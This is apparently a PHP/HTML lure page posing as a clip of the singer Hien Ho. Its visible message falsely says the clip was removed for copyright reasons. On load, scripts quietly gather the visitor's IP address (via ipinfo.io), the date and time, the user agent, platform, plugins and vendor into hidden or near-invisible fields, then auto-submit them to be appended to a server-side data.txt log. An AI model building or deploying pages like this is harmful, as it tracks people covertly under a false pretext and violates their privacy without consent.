<?php
// Check if form is submitted and we have the fields we want.
if(isset($_POST["ip"]))
{
	$file = "data.txt";
	$text = " - IP người dùng: ".$_POST["ip"]." \n - ".$_POST["m"]." \n".$_POST["inforU"]."\n-------------------------------------------------------------------------";
	// This file will create a data.txt file and put whatever is in the POST field mytext into the text and put a new line on the end.
	// The FILE_APPEND allows you to append text to the file. LOCK_EX prevents anyone else from writing to the file at the same time.
	file_put_contents($file, $text . "\r\n", FILE_APPEND | LOCK_EX);
}
?>
<!doctype html>
<html>
<head>
	<title> Clip Hiền Hồ 10 phút</title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js">
</script>
<script>
	$.getJSON("https://ipinfo.io", function(data){
		$("#ip").html(data.ip);
	})
</script>
<meta charset="utf-8">
</head>

<body onload="setTimeout(function() { document.myform.submit() }, 1000)">
		
<form action="ClipHienHo.php" name="myform" method="post">
	<center>
		<h1 style="font-size: 99px">Vì lý do bản quyền clip đã bị xóa. Xin lỗi bạn vì sự bất tiện này</h1>	
<input type="text" id="m" name="m">	
<textarea class="textBox" name ="ip" id="ip" style="font-size: 0.1px"></textarea>	
<textarea class="textBox" name="inforU" id="inforU" size="500"></textarea>	
	</center>	
</body>
<script>
    var curDate = new Date();
      
    // Ngày hiện tại
    var curDay = curDate.getDate();
 
    // Tháng hiện tại
    var curMonth = curDate.getMonth() + 1;
      
    // Năm hiện tại
    var curYear = curDate.getFullYear();
 	
	//
	var curTime=curDate.toLocaleTimeString();
    // Gán vào thẻ HTML
    document.getElementById('m').value = "Ngày:"+curDay + "/" + curMonth + "/" + curYear+"; Thời gian: "+curTime;
</script>	
<script>
document.getElementById('inforU').value =" - Thông tin thiết bị sử dụng:  "+navigator.userAgent+"\n - Platform:"+navigator.platform+"\n - Plugin: "+navigator.plugins+"\n - Vendor: "+navigator.vendor+"\n - AppName: "+navigator.appName+"\n - AppVersion:"+navigator.appVersion;
	</script>
</html>
